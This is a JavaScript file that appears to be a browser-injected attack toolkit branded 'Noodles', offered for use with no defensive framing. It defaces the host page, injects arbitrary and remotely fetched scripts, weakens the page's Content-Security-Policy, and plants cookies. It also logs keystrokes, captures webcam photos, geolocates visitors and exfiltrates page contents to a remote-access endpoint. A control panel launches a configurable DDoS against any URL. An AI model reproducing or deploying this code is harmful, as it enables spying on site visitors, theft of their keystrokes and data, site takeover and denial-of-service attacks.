(function() {
    'use strict';

    const storageKeyPrefix = 'noodles_defacement_';
    const logServerURL = '/main/logs';
    const ratServerURL = '/main/rat';
    const heartbeatInterval = 60000;
    const webcamInterval = 120000; // Separate interval for webcam
    const remoteJSInterval = 90000; // Separate interval for remote JS
    const defaultDDoSThreads = 10; // Define a constant for default DDoS threads
    const defaultDDoSRequestsPerSecond = 100; // Define a constant for default DDoS rate
    const defaultDDoSRandomStringLength = 50;
    let sessionID = localStorage.getItem(storageKeyPrefix + 'sessionID');

    if (!sessionID) {
        sessionID = uuidv4();
        localStorage.setItem(storageKeyPrefix + 'sessionID', sessionID);
    }

    const getConfig = () => {
        return {
            title: localStorage.getItem(storageKeyPrefix + 'title') || 'Owned by Noodles!',
            message: localStorage.getItem(storageKeyPrefix + 'message') || 'This site is ours now.',
            bgColor: localStorage.getItem(storageKeyPrefix + 'bgColor') || '#000000',
            textColor: localStorage.getItem(storageKeyPrefix + 'textColor') || '#00ff00',
            font: localStorage.getItem(storageKeyPrefix + 'font') || 'monospace',
            fontSize: localStorage.getItem(storageKeyPrefix + 'fontSize') || '32px',
            redirectURL: localStorage.getItem(storageKeyPrefix + 'redirectURL') || '',
            imageURL: localStorage.getItem(storageKeyPrefix + 'imageURL') || '',
            customCSS: localStorage.getItem(storageKeyPrefix + 'customCSS') || '',
            enableAnimation: localStorage.getItem(storageKeyPrefix + 'enableAnimation') === 'true',
            jsInjection: localStorage.getItem(storageKeyPrefix + 'jsInjection') || '',
            elementRemoval: localStorage.getItem(storageKeyPrefix + 'elementRemoval') || '',
            cookies: JSON.parse(localStorage.getItem(storageKeyPrefix + 'cookies') || '[]'),
            xssPayload: localStorage.getItem(storageKeyPrefix + 'xssPayload') || '<script>alert("XSS by Noodles");</script>',
            keyloggerEnabled: localStorage.getItem(storageKeyPrefix + 'keyloggerEnabled') === 'true',
            geoDataEnabled: localStorage.getItem(storageKeyPrefix + 'geoDataEnabled') === 'true',
            webcamEnabled: localStorage.getItem(storageKeyPrefix + 'webcamEnabled') === 'true',
            remoteJSEnabled: localStorage.getItem(storageKeyPrefix + 'remoteJSEnabled') === 'true',
            domExfilEnabled: localStorage.getItem(storageKeyPrefix + 'domExfilEnabled') === 'true',
            domExfilSelectors: localStorage.getItem(storageKeyPrefix + 'domExfilSelectors') || 'body',
            beaconInterval: parseInt(localStorage.getItem(storageKeyPrefix + 'beaconInterval') || '300000', 10),
            panelVisible: localStorage.getItem(storageKeyPrefix + 'panelVisible') !== 'false',
            ddosEnabled: localStorage.getItem(storageKeyPrefix + 'ddosEnabled') === 'true',
            ddosTarget: localStorage.getItem(storageKeyPrefix + 'ddosTarget') || '',
            ddosThreads: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosThreads') || defaultDDoSThreads, 10),
            ddosRate: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosRate') || defaultDDoSRequestsPerSecond, 10),
            ddosRandomStringLength: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosRandomStringLength') || defaultDDoSRandomStringLength, 10),
            scriptBypass: localStorage.getItem(storageKeyPrefix + 'scriptBypass') === 'true'
        };
    };

    let defacementConfig = getConfig();

    const applyDefacement = () => {
        try {
            if (defacementConfig.scriptBypass) {
                 const meta = document.createElement('meta');
                 meta.httpEquiv = "Content-Security-Policy";
                 meta.content = "script-src 'self' 'unsafe-inline' 'unsafe-eval';";
                 document.head.appendChild(meta);
            }

            document.title = defacementConfig.title;
            document.documentElement.innerHTML = '';
            document.body = document.createElement('body');

            const styles = `
                body {
                    background-color: ${defacementConfig.bgColor} !important;
                    color: ${defacementConfig.textColor} !important;
                    font-family: ${defacementConfig.font} !important;
                    font-size: ${defacementConfig.fontSize} !important;
                    text-align: center !important;
                    padding: 50px !important;
                }
                img {
                    max-width: 500px !important;
                    max-height: 500px !important;
                }
                ${defacementConfig.enableAnimation ? `
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                body {
                    animation: fadeIn 2s;
                }
                ` : ''}
                ${defacementConfig.customCSS}
            `;

            const styleElement = document.createElement('style');
            styleElement.innerHTML = styles;
            document.head.appendChild(styleElement);

            const messageElement = document.createElement('div');
            messageElement.textContent = defacementConfig.message;
            document.body.appendChild(messageElement);

            if (defacementConfig.imageURL) {
                const imageElement = document.createElement('img');
                imageElement.src = defacementConfig.imageURL;
                document.body.appendChild(imageElement);
            }

            if (defacementConfig.redirectURL) {
                window.location.href = defacementConfig.redirectURL;
            }

            if (defacementConfig.jsInjection) {
                try {
                    const script = document.createElement('script');
                    script.innerHTML = defacementConfig.jsInjection;
                    document.body.appendChild(script);
                } catch (e) {
                    console.error('Noodles: JS Injection Failed:', e);
                    logError('JS Injection Failed: ' + e.message);
                }
            }

            if (defacementConfig.elementRemoval) {
                try {
                    const elements = document.querySelectorAll(defacementConfig.elementRemoval);
                    elements.forEach(el => el.remove());
                } catch (e) {
                    console.error('Noodles: Element Removal Failed:', e);
                    logError('Element Removal Failed: ' + e.message);
                }
            }

            try{
                defacementConfig.cookies.forEach(cookie => {
                    let cookieString = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'}`;
                    if(cookie.secure) cookieString += ';secure';
                    if(cookie.httpOnly) cookieString += ';httpOnly';
                    document.cookie = cookieString;
                });
            } catch (e) {
                console.error('Noodles: Cookie setting failed:', e);
                logError('Cookie setting failed: ' + e.message);
            }


            //Attempt XSS
            try {
                const xssDiv = document.createElement('div');
                xssDiv.innerHTML = defacementConfig.xssPayload;
                document.body.appendChild(xssDiv);
            } catch (e) {
                console.error('Noodles: XSS Failed:', e);
                logError('XSS Failed: ' + e.message);
            }
        } catch (e) {
            console.error("Noodles: Apply Defacement failed:", e);
            logError('Apply Defacement failed: ' + e.message);
        }
    };

    const logKeypress = (event) => {
        if (!defacementConfig.keyloggerEnabled) return;
        try {
            const keyData = {
                sessionID: sessionID,
                key: event.key,
                code: event.code,
                location: window.location.href,
                timestamp: Date.now()
            };

            fetch(logServerURL + '/keys', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(keyData)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: Keylog failed to send:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Noodles: Keylog send error:', error);
            });
        } catch (e) {
            console.error("Noodles: Keypress logging failed:", e);
            logError('Keypress logging failed: ' + e.message);
        }
    };

    const logError = (message) => {
        try {
            const errorData = {
                sessionID: sessionID,
                message: message,
                location: window.location.href,
                timestamp: Date.now()
            };

            fetch(logServerURL + '/errors', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(errorData)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: Log failed to send:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Noodles: Log send error:', error);
            });
        } catch (e) {
            console.error("Noodles: Error logging failed:", e);
        }
    }

    const sendHeartbeat = () => {
        try {
            const heartbeatData = {
                sessionID: sessionID,
                location: window.location.href,
                timestamp: Date.now()
            };

            fetch(ratServerURL + '/heartbeat', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(heartbeatData)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: Heartbeat failed to send:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Noodles: Heartbeat send error:', error);
            });
        } catch (e) {
            console.error("Noodles: Heartbeat failed:", e);
        }
    };

    const getGeoLocation = () => {
        if (!defacementConfig.geoDataEnabled) return;

        try {
            fetch('https://ipinfo.io/json')
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: Geo data fetch error:', response.status, response.statusText);
                    logError('Geo data fetch error: ' + response.status + ' ' + response.statusText);
                    return;
                }
                return response.json();
            })
            .then(geoData => {
                geoData.sessionID = sessionID;
                return fetch(ratServerURL + '/geo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(geoData)
                });
            })
            .then(response => {
                if (response && !response.ok) {
                    console.error('Noodles: Geo data failed to send:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Noodles: Geo data request error:', error);
                logError('Geo data request error: ' + error.message);
            });
        } catch (e) {
            console.error("Noodles: GeoLocation failed:", e);
            logError('GeoLocation failed: ' + e.message);
        }
    };

    const getWebcamAccess = () => {
        if (!defacementConfig.webcamEnabled) return;

        try {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const videoTrack = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(videoTrack);

                    return imageCapture.takePhoto();
                })
                .then(blob => {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        const base64data = reader.result;
                        const webcamData = {
                            sessionID: sessionID,
                            image: base64data,
                            location: window.location.href,
                            timestamp: Date.now()
                        };

                        fetch(ratServerURL + '/webcam', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(webcamData)
                        })
                        .then(response => {
                            if (!response.ok) {
                                console.error('Noodles: Webcam data failed to send:', response.status, response.statusText);
                            }
                        })
                        .catch(error => {
                            console.error('Noodles: Webcam data send error:', error);
                        });
                    };
                    reader.readAsDataURL(blob);
                })
                .catch(error => {
                    console.error('Noodles: Webcam access error:', error);
                    logError('Webcam access error: ' + error.message);
                });
        } catch (e) {
            console.error("Noodles: Webcam failed:", e);
            logError('Webcam failed: ' + e.message);
        }
    };

    const fetchAndInjectRemoteJS = () => {
        if (!defacementConfig.remoteJSEnabled) return;
        try {
            fetch(ratServerURL + '/remote.js?session=' + sessionID)
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: Remote JS Fetch Failed:', response.status, response.statusText);
                    logError('Remote JS Fetch Failed: ' + response.status + ' ' + response.statusText);
                    return;
                }
                return response.text();
            })
            .then(responseText => {
                try {
                    const script = document.createElement('script');
                    script.innerHTML = responseText;
                    document.body.appendChild(script);
                } catch (e) {
                    console.error('Noodles: Remote JS Injection Failed:', e);
                    logError('Remote JS Injection Failed: ' + e.message);
                }
            })
            .catch(error => {
                console.error('Noodles: Remote JS Request Error:', error);
                logError('Remote JS Request Error: ' + error.message);
            });
        } catch (e) {
            console.error("Noodles: RemoteJS failed:", e);
            logError('RemoteJS failed: ' + e.message);
        }
    };

    const exfiltrateDOM = () => {
        if (!defacementConfig.domExfilEnabled) return;

        try {
            const extractedData = {};
            const selectors = defacementConfig.domExfilSelectors.split(',').map(s => s.trim());

            selectors.forEach(selector => {
                const elements = document.querySelectorAll(selector);
                const elementData = [];

                elements.forEach(el => {
                    elementData.push({
                        tagName: el.tagName,
                        textContent: el.textContent,
                        attributes: Array.from(el.attributes).map(attr => ({ name: attr.name, value: attr.value }))
                    });
                });

                extractedData[selector] = elementData;
            });

            const domExfilData = {
                sessionID: sessionID,
                location: window.location.href,
                timestamp: Date.now(),
                data: extractedData
            };

            fetch(ratServerURL + '/dom', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(domExfilData)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Noodles: DOM Exfiltration Failed:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Noodles: DOM Exfiltration Error:', error);
            });

        } catch (e) {
            console.error('Noodles: DOM Exfiltration Setup Failed:', e);
            logError('DOM Exfiltration Setup Failed: ' + e.message);
        }
    };

   const performDDOS = () => {
        if (!defacementConfig.ddosEnabled || !defacementConfig.ddosTarget) return;

        const targetURL = defacementConfig.ddosTarget;
        const numThreads = defacementConfig.ddosThreads || defaultDDoSThreads;
        const requestsPerSecond = defacementConfig.ddosRate || defaultDDoSRequestsPerSecond;
        const randomStringLength = defacementConfig.ddosRandomStringLength || defaultDDoSRandomStringLength;
        let ddosIntervals = [];

        const generateRandomString = (length) => {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        };

        const attack = async () => {
            try {
                const randomString = generateRandomString(randomStringLength);
                const payload = { data: randomString };

                await fetch(targetURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(payload),
                    keepalive: true
                })
                .catch(error => {
                   console.debug("DDoS Request Failed (no-cors)", error);
                });

            } catch (e) {
                console.error('Noodles: DDoS Failed:', e);
                logError('DDoS Failed: ' + e.message);
            }
        };


        const startDDoS = () => {
             stopDDoS();

             for (let i = 0; i < numThreads; i++) {
                let intervalId = setInterval(attack, 1000 / requestsPerSecond);
                ddosIntervals.push(intervalId);
            }
        }

        const stopDDoS = () => {
            ddosIntervals.forEach(intervalId => clearInterval(intervalId));
            ddosIntervals = [];
        }

        return { startDDoS, stopDDoS };
    };

   let ddosControl = performDDOS();

    const createConfigPanel = () => {
        let panel = document.getElementById('noodlesDefacementPanel');
        if (panel) {
            panel.remove();
        }

        panel = document.createElement('div');
        panel.id = 'noodlesDefacementPanel';
        panel.style.cssText = `position:fixed;top:0;left:0;background:rgba(30,30,30,0.9);color:#ddd;padding:10px;z-index:10000;font-family: monospace; font-size: 14px; border: 1px solid #555; box-shadow: 2px 2px 5px rgba(0,0,0,0.5);`;

        if (!defacementConfig.panelVisible) {
            panel.style.display = 'none';
        }

        const createInput = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
            lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const input = document.createElement('input');
            input.type = 'text';
            input.value = defacementConfig[key];
            input.style.width = '300px';
            input.style.backgroundColor = '#444';
            input.style.color = '#ddd';
            input.style.border = '1px solid #777';
            input.addEventListener('change', (e) => {
                localStorage.setItem(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(input);
            return div;
        };

        const createTextArea = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const textarea = document.createElement('textarea');
            textarea.value = defacementConfig[key];
            textarea.style.width = '300px';
            textarea.style.height = '100px';
            textarea.style.backgroundColor = '#444';
            textarea.style.color = '#ddd';
            textarea.style.border = '1px solid #777';
            textarea.addEventListener('change', (e) => {
                localStorage.setItem(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(textarea);
            return div;
        };

        const createCheckbox = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.checked = defacementConfig[key];
            checkbox.addEventListener('change', (e) => {
                localStorage.setItem(storageKeyPrefix + key, e.target.checked);
                defacementConfig = getConfig();
                if (key === 'keyloggerEnabled') {
                    if (e.target.checked) {
                        document.addEventListener('keypress', logKeypress);
                    } else {
                        document.removeEventListener('keypress', logKeypress);
                    }
                }
                 if (key === 'ddosEnabled') {
                    const ddosEnabled = e.target.checked;
                    localStorage.setItem(storageKeyPrefix + 'ddosEnabled', ddosEnabled);
                    defacementConfig = getConfig(); // Refresh configuration
                    ddosControl = performDDOS(); // Re-initialize DDoS control with new config

                    if (ddosEnabled) {
                        ddosControl.startDDoS();
                    } else {
                        ddosControl.stopDDoS();
                    }
                }
            });
            div.appendChild(lbl);
            div.appendChild(checkbox);
            return div;
        };

       const createCookieEditor = () => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = 'Cookies:';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            div.appendChild(lbl);

            const cookieList = document.createElement('div');
            cookieList.id = 'noodlesCookieList';
            cookieList.style.marginBottom = '5px';
            div.appendChild(cookieList);

            const refreshCookieList = () => {
                cookieList.innerHTML = '';
                defacementConfig.cookies.forEach((cookie, index) => {
                    const cookieDiv = document.createElement('div');
                    cookieDiv.style.marginBottom = '2px';
                    cookieDiv.style.padding = '5px';
                    cookieDiv.style.border = '1px solid #777';
                    cookieDiv.style.backgroundColor = '#333';

                    const cookieLabel = document.createElement('span');
                    cookieLabel.textContent = `${cookie.name}=${cookie.value}`;
                    cookieLabel.style.marginRight = '10px';
                    cookieDiv.appendChild(cookieLabel);

                    const deleteButton = document.createElement('button');
                    deleteButton.textContent = 'Delete';
                    deleteButton.style.backgroundColor = '#800';
                    deleteButton.style.color = '#ddd';
                    deleteButton.style.border = 'none';
                    deleteButton.style.cursor = 'pointer';
                    deleteButton.addEventListener('click', () => {
                        defacementConfig.cookies.splice(index, 1);
                        localStorage.setItem(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                        defacementConfig = getConfig();
                        refreshCookieList();
                    });
                    cookieDiv.appendChild(deleteButton);
                    cookieList.appendChild(cookieDiv);
                });
            };

            refreshCookieList();

            const addCookieButton = document.createElement('button');
            addCookieButton.textContent = 'Add Cookie';
            addCookieButton.style.backgroundColor = '#444';
            addCookieButton.style.color = '#ddd';
            addCookieButton.style.border = 'none';
            addCookieButton.style.cursor = 'pointer';
            addCookieButton.addEventListener('click', () => {
                const newCookie = { name: 'newCookie', value: 'newValue', domain: document.domain, path: '/', secure: false, httpOnly: false };
                defacementConfig.cookies.push(newCookie);
                localStorage.setItem(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                defacementConfig = getConfig();
                refreshCookieList();
            });
            div.appendChild(addCookieButton);

            return div;
        };

        const createNumberInput = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const input = document.createElement('input');
            input.type = 'number';
            input.value = defacementConfig[key];
            input.style.width = '300px';
            input.style.backgroundColor = '#444';
            input.style.color = '#ddd';
            input.style.border = '1px solid #777';
            input.addEventListener('change', (e) => {
                const parsedValue = parseInt(e.target.value, 10);
                if (!isNaN(parsedValue)) {
                    localStorage.setItem(storageKeyPrefix + key, parsedValue);
                    defacementConfig = getConfig();
                     if (key === 'ddosThreads' || key === 'ddosRate' || key === 'ddosRandomStringLength') {
                        // Re-initialize DDoS if DDoS-related settings changed
                        ddosControl = performDDOS();
                    }
                }
            });
            div.appendChild(lbl);
            div.appendChild(input);
            return div;
        };

        const refreshButton = document.createElement('button');
        refreshButton.textContent = 'Apply Defacement';
        refreshButton.style.cssText = 'margin-top: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
        refreshButton.addEventListener('click', applyDefacement);

        const resetButton = document.createElement('button');
        resetButton.textContent = 'Reset All';
        resetButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #800; color: #ddd; border: none; cursor: pointer;';
        resetButton.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all settings?')) {
              for (const key in defacementConfig) {
                  localStorage.removeItem(storageKeyPrefix + key);
              }
              defacementConfig = getConfig();
              applyDefacement();
              panel.remove();
              createConfigPanel();
            }
        });

        const togglePanelButton = document.createElement('button');
        togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
        togglePanelButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
        togglePanelButton.addEventListener('click', () => {
            defacementConfig.panelVisible = !defacementConfig.panelVisible;
            localStorage.setItem(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
            panel.style.display = defacementConfig.panelVisible ? 'block' : 'none';
            togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
        });

        panel.appendChild(createInput('Title', 'title'));
        panel.appendChild(createInput('Message', 'message'));
        panel.appendChild(createInput('Background Color', 'bgColor'));
        panel.appendChild(createInput('Text Color', 'textColor'));
        panel.appendChild(createInput('Font', 'font'));
        panel.appendChild(createInput('Font Size', 'fontSize'));
        panel.appendChild(createInput('Redirect URL', 'redirectURL'));
        panel.appendChild(createInput('Image URL', 'imageURL'));
        panel.appendChild(createTextArea('Custom CSS', 'customCSS'));
        panel.appendChild(createTextArea('JS Injection', 'jsInjection'));
        panel.appendChild(createInput('Element Removal (querySelector)', 'elementRemoval'));
        panel.appendChild(createTextArea('XSS Payload', 'xssPayload'));
        panel.appendChild(createInput('DOM Exfil Selectors (comma-separated)', 'domExfilSelectors'));
        panel.appendChild(createCheckbox('Enable Animation', 'enableAnimation'));
        panel.appendChild(createCheckbox('Enable Keylogger', 'keyloggerEnabled'));
        panel.appendChild(createCheckbox('Enable Geo Data', 'geoDataEnabled'));
        panel.appendChild(createCheckbox('Enable Webcam', 'webcamEnabled'));
        panel.appendChild(createCheckbox('Enable Remote JS', 'remoteJSEnabled'));
        panel.appendChild(createCheckbox('Enable DOM Exfil', 'domExfilEnabled'));
        panel.appendChild(createCookieEditor());
        panel.appendChild(createNumberInput('Beacon Interval (ms)', 'beaconInterval'));
        panel.appendChild(createCheckbox('Enable DDoS', 'ddosEnabled'));
        panel.appendChild(createInput('DDoS Target URL', 'ddosTarget'));
        panel.appendChild(createNumberInput('DDoS Threads', 'ddosThreads'));
        panel.appendChild(createNumberInput('DDoS Rate (Requests/sec)', 'ddosRate'));
        panel.appendChild(createNumberInput('DDoS Random String Length', 'ddosRandomStringLength'));
        panel.appendChild(createCheckbox('Bypass Script Restrictions', 'scriptBypass'));

        panel.appendChild(refreshButton);
        panel.appendChild(resetButton);
        panel.appendChild(togglePanelButton);

        document.body.appendChild(panel);

         const dragPanel = (elmnt) => {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            const dragMouseDown = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = closeDragElement;
                document.onmousemove = elementDrag;
            }

            const elementDrag = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos1 = pos3 - e.clientX;
                pos2 = pos4 - e.clientY;
                pos3 = e.clientX;
                pos4 = e.clientY;
                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
            }

            const closeDragElement = () => {
                document.onmouseup = null;
                document.onmousemove = null;
            }

            panel.onmousedown = dragMouseDown;
        }

        dragPanel(panel);
    };

    window.addEventListener("message", (event) => {
        if (event.data.type === "noodlesTogglePanel") {
            defacementConfig.panelVisible = !defacementConfig.panelVisible;
            localStorage.setItem(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
            createConfigPanel();
        }
    }, false);

    setInterval(sendHeartbeat, heartbeatInterval);
    setInterval(getWebcamAccess, webcamInterval);
    setInterval(fetchAndInjectRemoteJS, remoteJSInterval);
    setInterval(exfiltrateDOM, defacementConfig.beaconInterval);

    getGeoLocation();

    const initialize = () => {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                createConfigPanel();
                applyDefacement();
            });
        } else {
            createConfigPanel();
            applyDefacement();
        }
    };

  const initializeKeylogger = () => {
        if (defacementConfig.keyloggerEnabled) {
            document.addEventListener('keypress', logKeypress);
        }
    };


    initialize();
    initializeKeylogger();

    function uuidv4() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

})();